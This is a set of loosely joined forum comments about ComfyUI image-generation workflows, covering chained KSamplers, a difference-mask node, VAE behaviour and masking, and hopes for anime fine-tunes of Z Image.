I’m curious whether it helped streamline your workflow.\n\nThe main idea here is to avoid the kind of manual overhead described in that long comment - things like saving intermediate latent files, digging through folders to find the right one, copying and pasting them back into the graph, and reloading just to make a tiny adjustment. That approach works in a pinch, but it’s not how latent-space editing was really meant to be used within a single, continuous generation task.\n\nIn ComfyUI the standard and most efficient approach for iterative refinement is chaining KSamplers and passing the latent directly from one to the next. This keeps everything in memory, avoids file clutter, and lets you isolate each edit step cleanly.\n\nThat’s exactly what this workflow does: each KSampler handles one specific change (e.g., pose, lighting, expression), and the latent flows sequentially down the chain. You can disable all but the first group, iterate until you’re happy, lock the seed, then move on to the next stage - all without ever touching the filesystem.\n\nIt’s a bit wordy, I know, but maybe my take on this gets missed because it hasn’t been explained in enough detail.",

This could make the issue a bit tricky to resolve. The new TBG Difference Mask node compares two images, mixes SSIM (structure) and RGB difference (color), then thresholds and area-filters to isolate real, coherent changes (like a shirt swap) while ignoring tiny model artifacts and noise.\n\nTBG Takeaways with the new TBG Difference Mask node are now uploaded and accessible from the Manager. The workflow for the SAM and Diff nodes can be found here: [https://www.patreon.com/posts/149003920](https://www.patreon.com/posts/149003920) (free access).

(My guess is, that the VAE doesn't keep the error function. I.e. a pixel change resulting in a Delta E and luminosity change of \"err\" should create after the same change in latent space also an error of \"err\". Most likely the VAE wasn't trained with that constraint). But that's nothing you can do.\n* Use masking. Only allow the model to change the pixels you are allowing it to, the others are prevent from changing with a mask.\n\nWith tools like Krita AI it's very simple to mask the area that is allowed to change.

Maybe some can get distilled, but with a domain specific distilled model you can probably still have diverse outputs if you are focusing on anime, just realistic etc. this way Loras can be a bit more universal and we don't need to train the same one three times for different bases.\n\nMaybe there are way smarter people who already have answers, but while I have finetuned SDXL models, I don't even know how to start with something like Z Image, probably entirely different ball game. It might take some time for the base tools to be developed, experiments on how to best fine-tune etc, and that will cost money so I don't expect a bunch to be on it right away. \n\nI think we'll have fun with the standard z image models for the next 3-6months then see some usable finetuned coming out.\n\nI am envious of NovelAI cause it does anime generation stunningly and I feel like Z Image has the potential, but it needs a whole bunch of anime knowledge. Maybe that's one fine-tune I can pursue once the tools have been established. Get it to know each anime intimately like NovelAI from 2026 right down to the 60s.\n\nAnd when I say fine tune I don't mean just Loras. Although Loras are great for a lot of things, sometimes you need the model to be foundationally trained towards things like this",
